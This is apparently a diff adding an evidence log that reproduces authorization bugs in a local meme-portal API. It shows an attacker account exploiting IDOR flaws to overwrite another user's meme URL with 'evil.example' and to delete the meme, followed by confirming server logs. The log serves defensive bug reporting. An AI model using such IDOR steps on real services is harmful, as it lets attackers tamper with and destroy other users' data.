@@ -1,0 +1,45 @@
+﻿# TKT-107 Before Reproduction Evidence (Live API)
+# Timestamp: 2026-11-23T23:42:18.5887138+07:00
+# Base URL: http://localhost:8080
+
+=== 1. Register Victim A & Attacker B ===
+POST /api/v1/auth/register (Victim A)   -> HTTP 201 | userId= | email=tkt107-victim-1795452138@example.com
+POST /api/v1/auth/register (Attacker B) -> HTTP 201 | userId= | email=tkt107-attacker-1795452138@example.com
+
+=== 2. Activate Subscriptions for Victim A & Attacker B ===
+Victim A checkout=201, confirm=200
+Attacker B checkout=201, confirm=200
+
+=== 3. Victim A Creates Meme ===
+POST /api/v1/memes/upload (Victim A) -> HTTP 201
+Response: {"success":true,"code":30106,"message":"upload disiapkan","data":{"id":"925dee51-7990-4980-824b-0c3d0bfc064b","uploadUrl":"http://localhost:3900/meme-portal/base/66f64c8653c71e77c2a7ac56.png?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=GK4f8e1c2a9b3d7e6051c2f3a4b5c6d7e8%2F20261123%2Fgarage%2Fs3%2Faws4_request\u0026X-Amz-Date=20261123T164218Z\u0026X-Amz-Expires=900\u0026X-Amz-SignedHeaders=content-type%3Bhost\u0026x-id=PutObject\u0026X-Amz-Signature=ebf370267dd1b05bbb978b16d257c73b16bdefe3c7394f47f8c677b45da80f85","baseUrl":"http://meme-portal.web.garage.localhost:3902/base/66f64c8653c71e77c2a7ac56.png"}}
+
+
+=== 4. [BUG 1] ResultUpload (GetByID 10-col vs 9-arg scan bug + missing user_id check) ===
+POST /api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b/result-upload (Victim A - OWNER)    -> HTTP 500
+Response: 
+POST /api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b/result-upload (Attacker B - IDOR)   -> HTTP 500
+Response: 
+
+=== 5. [BUG 2] Complete (SetResultURL IDOR - Attacker B tampers & reads Victim A's meme) ===
+POST /api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b/complete (Attacker B) -> HTTP 200
+Response: {"success":true,"code":30104,"message":"meme selesai","data":{"id":"925dee51-7990-4980-824b-0c3d0bfc064b","userId":"28133234-b413-4a2b-912d-ca19c2799ca9","title":"Victim Secret Meme","baseUrl":"http://meme-portal.web.garage.localhost:3902/base/66f64c8653c71e77c2a7ac56.png","resultUrl":"http://evil.example/hijacked.png","topText":"","bottomText":"","fontSize":0,"createdAt":"2026-11-23T23:42:18.952614+07:00"}}
+
+
+=== 6. [BUG 3] Delete (Delete IDOR - Attacker B deletes Victim A's meme) ===
+DELETE /api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b (Attacker B) -> HTTP 200
+Response: {"success":true,"code":30105,"message":"meme dihapus"}
+
+GET /api/v1/memes (Victim A after attack) -> HTTP 200
+Response: {"success":true,"code":30102,"message":"daftar meme","data":{"items":[],"total":0}}
+
+
+
+=== Server Log Snippet (Bug 1 Root Cause Confirmation) ===
+time=2026-11-23T23:42:18.980+07:00 level=ERROR msg="meme handler: internal error" err="number of field descriptions must equal number of destinations, got 10 and 9"
+time=2026-11-23T23:42:18.980+07:00 level=INFO msg=request method=POST path=/api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b/result-upload status=500 duration=5.3673ms
+time=2026-11-23T23:42:19.014+07:00 level=ERROR msg="meme handler: internal error" err="number of field descriptions must equal number of destinations, got 10 and 9"
+time=2026-11-23T23:42:19.014+07:00 level=INFO msg=request method=POST path=/api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b/result-upload status=500 duration=6.0893ms
+time=2026-11-23T23:42:19.028+07:00 level=INFO msg=request method=POST path=/api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b/complete status=200 duration=11.0425ms
+time=2026-11-23T23:42:19.065+07:00 level=INFO msg=request method=DELETE path=/api/v1/memes/925dee51-7990-4980-824b-0c3d0bfc064b status=200 duration=7.3421ms
+time=2026-11-23T23:42:19.089+07:00 level=INFO msg=request method=GET path=/api/v1/memes status=200 duration=4.876ms
